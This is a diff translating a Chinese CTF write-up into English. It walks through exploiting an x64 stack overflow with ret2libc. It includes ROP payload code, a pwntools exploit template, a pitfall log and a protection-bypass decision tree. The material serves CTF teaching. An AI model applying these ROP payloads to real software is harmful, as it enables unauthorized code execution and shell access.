@@ -1,66 +1,66 @@
-# [种子] CTF Pwn — x64 栈溢出 + ROP 链调用 system
+# [Seed] CTF Pwn — x64 stack overflow + ROP chain calling system
 
-## 场景分类
-CTF / 二进制利用
+## Scenario category
+CTF / binary exploitation
 
-## 目标概述
-一个 64 位 ELF，存在 `read()` 越界写入栈缓冲区。本机有 NX（不可执行栈）但无 PIE，无 stack canary。利用 ROP gadget 调用 libc 的 `system("/bin/sh")` 拿 shell。
+## Goal summary
+A 64-bit ELF has an out-of-bounds `read()` that writes to a stack buffer. The local binary has NX (a non-executable stack), no PIE, and no stack canary. Use ROP gadgets to call libc `system("/bin/sh")` and get a shell.
 
-## 完整执行链路
+## Full execution path
 
-1. 基础侦察
+1. Basic reconnaissance
    ```bash
    file vuln          # ELF 64-bit, dynamically linked, not stripped
    checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
    strings vuln | grep -i 'flag\|/bin/sh\|system'
    ```
-2. 用 IDA / Ghidra 看 main → 发现 `read(0, buf, 0x100)` 但 `buf` 只有 0x40 字节
-3. 计算溢出偏移
+2. Inspect `main` in IDA / Ghidra → find `read(0, buf, 0x100)` even though `buf` is only 0x40 bytes.
+3. Calculate the overflow offset.
    ```bash
    pwndbg> cyclic 200
-   # 输入到目标程序，崩溃后看 RSP
+   # Send input to the target, then inspect RSP after the crash.
    pwndbg> cyclic -l 0x6161616c
-   # 偏移 = 72
+   # Offset = 72
    ```
-4. 由于没 PIE，PLT 和 GOT 都是固定地址
-5. 第一阶段（无 libc 信息）：泄漏 `puts@GOT` 内容算 libc base
+4. Because there is no PIE, PLT and GOT addresses are fixed.
+5. First stage (without libc information): leak the `puts@GOT` contents and calculate the libc base.
    ```python
    payload  = b'A' * 72
    payload += p64(POP_RDI)
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
-   payload += p64(elf.symbols['main'])     # 回到 main 二次利用
+   payload += p64(elf.symbols['main'])     # Return to main for a second stage
    ```
-6. 接收 puts 输出，定位 libc 版本（用 libc-database 查询）
-7. 第二阶段：构造 system("/bin/sh")
+6. Receive the puts output and identify the libc version with libc-database.
+7. Second stage: build `system("/bin/sh")`.
    ```python
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
    payload += p64(libc_base + libc.symbols['system'])
    ```
-8. 拿 shell → cat flag
+8. Get a shell → run `cat flag`.
 
-## 踩坑记录
+## Pitfall log
 
-| 问题 | 原因 | 解决方案 | 耗时 |
+| Problem | Cause | Solution | Time |
 |------|------|---------|------|
-| ROP 调用 system 后程序崩溃，没 shell | 栈未对齐到 16 字节（Ubuntu 18.04+ 对 movaps 严格） | system 前加一个 ret gadget 做 padding | 30min |
-| 本地能打通，远程打不通 | libc 版本不一致 | 用 puts 泄漏一个函数地址 → 上 libc-database 查精确版本 | 40min |
-| pwntools recv 卡住 | 程序输出用了 setbuf(NULL) 但远程未关闭 stderr 缓冲 | 用 sendlineafter / recvuntil 精确同步 | 15min |
-| 一打远程就 SIGPIPE | 第二阶段 payload 还在使用上一轮的 io 对象 | 用 `process` / `remote` 之后 io 必须复用同一个连接，主进程死了就完了 | 20min |
-| ROPgadget 输出太多 | 工具默认列所有 gadget | `ROPgadget --binary vuln --only "pop\|ret"` 过滤 | 5min |
+| The program crashed after the ROP call to system and no shell appeared | The stack was not aligned to 16 bytes (Ubuntu 18.04+ enforces this for movaps) | Add a ret gadget as padding before system | 30min |
+| The exploit worked locally but not remotely | The libc versions differed | Leak one function address with puts → use libc-database to find the exact version | 40min |
+| pwntools recv hung | The program used `setbuf(NULL)`, but the remote process did not flush stderr | Synchronize with sendlineafter / recvuntil | 15min |
+| The remote run immediately returned SIGPIPE | The second-stage payload used the previous round's io object | Reuse the same connection after `process` / `remote`; the main process must stay alive | 20min |
+| ROPgadget produced too many results | The tool lists every gadget by default | Filter with `ROPgadget --binary vuln --only "pop\|ret"` | 5min |
 
-## 工具链发现
+## Toolchain findings
 
-- **pwntools** 是 Python 写 exploit 的事实标准（`from pwn import *`）
-- **pwndbg** 比 GDB 自带的强 10 倍（带 cyclic / vmmap / heap 命令）
-- **ROPgadget** vs **ropper**：ropper 输出更友好，支持搜索 syscall chain
-- **libc-database** 通过泄漏的 1 个 libc 函数地址匹配确切 libc 版本
-- **one_gadget** 找一个能直接 execve("/bin/sh") 的 libc gadget，比手动 ROP 更短
+- **pwntools** is the usual Python library for writing exploits (`from pwn import *`).
+- **pwndbg** adds cyclic, vmmap, and heap commands to GDB.
+- **ROPgadget** vs **ropper**: ropper output is easier to read and supports syscall-chain searches.
+- **libc-database** matches one leaked libc function address to the exact libc version.
+- **one_gadget** finds a libc gadget that can call `execve("/bin/sh")` directly, which shortens the ROP chain.
 
-## 关键代码/命令
+## Key code / commands
 
-完整 exploit 模板：
+Complete exploit template:
 
 ```python
 #!/usr/bin/env python3
@@ -70,7 +70,7 @@ context.binary = elf = ELF('./vuln')
 libc = ELF('./libc.so.6')
 
 POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
-RET     = 0x40101a   # 用于栈对齐
+RET     = 0x40101a   # Stack-alignment gadget
 
 def exp():
     io = remote('chal.example.com', 31337)
@@ -101,41 +101,41 @@ if __name__ == '__main__':
     exp()
 ```
 
-## 对本包的改进建议
+## Improvement suggestions for this package
 
-- CTF-Sandbox-Orchestrator 的 `competition-reverse-pwn` 应增加 `pwn-rop-cheatsheet.md`，把这个流程做成模板
-- bootstrap manifest 加入 pwntools / pwndbg / one_gadget
+- Add `pwn-rop-cheatsheet.md` to CTF-Sandbox-Orchestrator `competition-reverse-pwn` and make this flow a template.
+- Add pwntools / pwndbg / one_gadget to the bootstrap manifest.
 
-## 可复用的模式/脚本片段
+## Reusable patterns / script fragments
 
-**ROP 利用决策树**：
+**ROP exploitation decision tree**:
 
 ```text
-checksec → 看保护
-├── 无 NX → shellcode 直接打 (古早做法)
-├── NX + 无 PIE → ret2libc 经典
-├── NX + PIE + 无 Canary → 先泄漏 PIE 基址 → ret2libc
-├── 有 Canary → 先想办法泄漏 Canary（格式化字符串 / off-by-one）
-└── Full RELRO + Canary + PIE → 难度大，常见手段：fork 不重 ASLR / __libc_start_main / SROP
+checksec → inspect protections
+├── No NX → send shellcode directly (older approach)
+├── NX + no PIE → classic ret2libc
+├── NX + PIE + no Canary → leak the PIE base first → ret2libc
+├── Canary present → find a way to leak the canary (format string / off-by-one)
+└── Full RELRO + Canary + PIE → difficult; common options: fork without ASLR refresh / __libc_start_main / SROP
 ```
 
-**libc 泄漏 → 利用 标准两阶段 payload**：
+**Standard two-stage payload: libc leak → exploitation**:
 
 ```text
-Stage 1: leak puts@GOT → 算 libc base → 回 main
+Stage 1: leak puts@GOT → calculate libc base → return to main
 Stage 2: pop rdi; "/bin/sh"; ret; system
 ```
 
-## 进化动作
-- [ ] CTF orchestrator 增加 pwn 速查页
-- [ ] bootstrap-manifest 加入 pwntools / pwndbg / one_gadget
-- [ ] reverse-engineering/tools-dynamic.md 引用本案例
+## Evolution actions
+- [ ] Add a pwn quick-reference page to CTF-Sandbox-Orchestrator
+- [ ] Add pwntools / pwndbg / one_gadget to the bootstrap manifest
+- [ ] Reference this case from reverse-engineering/tools-dynamic.md
 
-## 环境信息
+## Environment information
 - Kali 2026.x / Ubuntu 22.04
-- pwntools 4.x, pwndbg 最新, ROPgadget 7.x
-- libc 版本: glibc 2.31 / 2.35（CTF 常见）
-- 目标架构: x86_64
+- pwntools 4.x, latest pwndbg, ROPgadget 7.x
+- libc version: glibc 2.31 / 2.35 (common in CTFs)
+- Target architecture: x86_64
 
-## 脱敏要求
-本条目为种子数据，基于公开 CTF 技术模式编写，不涉及任何真实赛题或闭源系统。
+## Redaction requirements
+This seed entry is based on public CTF techniques and does not involve a real challenge or closed-source system.
